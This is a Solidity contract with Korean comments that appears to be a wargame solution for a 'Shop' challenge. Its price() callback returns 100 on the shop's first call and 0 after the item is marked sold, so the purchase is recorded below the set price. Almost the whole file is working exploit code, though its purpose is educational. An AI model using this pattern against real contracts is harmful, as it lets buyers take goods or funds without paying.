// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

/* 목표
 * 기존 price 보다 낮은 가격으로 buy 함수 결과 조작하기
 *
 * 공격 방식
 * 1. msg.sender가 Shop 컨트랙트 주소 && 첫번째로 price 함수 실행 시에는 price = 100으로 반환
 * 2. msg.sedner가 Shop 컨트랙트 주소 && 두번째 이후 price 함수 실행 시에는 price = 0으로 반환
 */

interface Shop {
    function isSold() external returns (bool);
    function buy() external;
}
contract Solve {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        Shop(target).buy();
    }

    function price() public returns (uint256) {
        uint256 result = 0;

        if (msg.sender == target && !Shop(target).isSold()) {
            result = 100;
        }

        return result;
    }
}